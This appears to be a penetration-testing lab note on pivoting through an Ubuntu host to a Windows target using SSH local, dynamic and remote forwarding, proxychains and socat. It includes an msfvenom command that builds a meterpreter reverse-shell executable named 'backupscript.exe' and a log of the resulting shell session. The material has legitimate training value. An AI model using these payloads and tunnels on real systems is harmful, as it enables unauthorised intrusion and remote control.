
Attacker IP (Our machine): `10.10.15.218`
Pivot host (Ubuntu machine):  `10.129.101.215` and `172.16.5.129`
Target host (Windows machine): `172.16.5.19`

Attacker -> Pivot Host -> Target Host

```
										   +------------------+
                                           |                  |
                                           |   Target Host    |
                                           |    (Windows)     |
                                           |                  |
                                           |  172.16.5.19     |
                                           |                  |
                                           +--------^---------+
                                                    |
                                                    | Internal Network
                                                    | (172.16.5.0/24)
                                                    |
+------------------+                       +--------+---------+
|                  |                       |                  |
|   Attacker IP    |    Public Network     |   Pivot Host     |
|  (Our Machine)   |======================>|    (Ubuntu)      |
|                  |    (10.0.0.0/8)       |                  |
|  10.10.15.218    |                       |  10.129.101.215  |
|                  |                       |  172.16.5.129    |
+------------------+                       +------------------+
```

### Forwarding with SSH
##### Local Forward
```sh
ssh -L 9999:172.16.5.19:3389 ubuntu@10.129.101.215 -NTv
```
> Connections from localhost to port `9999` is forwarded to the IP `172.16.5.19` and port `3389` as seen from the pivot host: `10.129.101.215`. 
> `-NTv` is used to not create a TTY (`-T`), not execute any command on connection (`-N`) and to be verbose (`-v`). This is usefull for port forwarding scenarios.

Example:
```sh
xfreerdp /v:localhost:9999 /u:victor /p:pass@123
```
> We connect to port `9999` on localhost with credentials for an RDP session. This is forwarded to the Pivot host, which will connect to the Target host on port 3389 (RDP).

##### Dynamic Forward
```sh
ssh -D 1080 ubuntu@10.129.101.215 -NTv
```
> This creates a socks5 tunell through port `1080`. When we use `proxychains4` in front of a command. It will be executed as it would if it were executed on the Pivot host.

```sh
 tail /etc/proxychains4.conf -n6
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080
```

Example:
```sh
proxychains4 xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
> Here `proxychains4` is used to create an RDP session to `172.16.5.19`. That IP is the IP as seen from the Pivot host, and not localhost as we did in local forwarding.

##### Remote Forward
Remote forwarding is used when you want to forward a port on a remote machine to a port on the local machine. For example when you want a reverse shell from the Target host, behind the Pivot host. 

```sh
ssh -R 172.16.5.19:8080:10.10.15.218:4444 ubuntu@10.129.101.215 -NTv
```
> Connections from the Target host (`172.16.5.19`) on port `8080` is forwarded to our attacker machine (`10.10.15.218`) on port `4444`. It is important to remember that these IPs are as seen from the Pivot host (`10.129.101.215`)

Example:
We have a `msfvenom` payload on the Target Windows machine (`172.16.5.19`) that is created with the following command:
```sh
msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
Notice that the `lhost` IP is set to the Pivot machines IP address (`172.16.5.129`).
We can then start a listener on the attacker machine on port `4444`. 
```
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8443
[*] Meterpreter session 58 opened (10.10.15.218:4444 -> 10.10.15.218:46407) at 2025-03-23 12:54:50 +0100

meterpreter > shell
Process 3452 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\victor>
```
When the reverse shell payload on the Target Windows host is executed it will connect to the Pivot host on port 8080, which will forward that to our attacker machine on port 4444.


### Forwarding with SOCAT
Socat can forward without using SSH, so it doesnt require SSH access to the Pivot host. Socat needs to be installed on the remote machine. The tunnel will be unencrypted though.

- Locally
```sh
socat -v TCP-LISTEN:9999,fork,reuseaddr TCP:10.129.101.215:2222
```
> This sets up a listener on port `9999` locally, which will forward it to the host `10.129.101.215` on port `2222`

- Remote Pivot host (`10.129.101.215`)
```sh
socat -v TCP-LISTEN:2222,fork,reuseaddr TCP:172.16.5.19:3389
```
> Setting up a listener on the remote (`10.129.101.215`) server on port `2222`. It then forwards it to the Target Windows machine `172.16.5.19` on port `3389`. 


The above SOCAT tunell is equivalent to:
```sh
ssh -L 9999:172.16.5.19:3389 ubuntu@10.129.101.215 -NTv
```